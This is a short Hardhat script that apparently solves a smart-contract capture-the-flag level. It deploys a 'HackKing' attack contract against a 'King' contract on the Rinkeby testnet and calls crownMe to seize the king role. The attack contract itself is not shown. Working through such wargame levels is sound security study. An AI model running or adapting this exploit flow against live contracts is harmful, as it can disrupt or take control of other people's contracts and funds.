require("dotenv").config();

const provider = new hre.ethers.providers.JsonRpcProvider( process.env.RINKEBY_URL );
const wallet = new hre.ethers.Wallet( process.env.PRIVATE_KEY, provider );

const main = async () => {
  const kingAbi = await hre.artifacts.readArtifact("King");
  const kingContract = await new hre.ethers.Contract("0x728a90D5dF447c3298786985b24Af810cb4Cde71", kingAbi.abi, wallet);
  console.log("Delegate contract: " + kingContract.address);

  const hackKingFactory = await hre.ethers.getContractFactory("HackKing");
  const hackKingContract = await hackKingFactory.deploy('0x728a90D5dF447c3298786985b24Af810cb4Cde71', {value: 14901166});
  await hackKingContract.deployed();
  console.log(`HackKing contract: ${hackKingContract.address}`)

  let txn = await hackKingContract.crownMe(14901166, 100000);
  await txn.wait();
  console.log("The new king has been crowned.");
}

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
};

runMain();
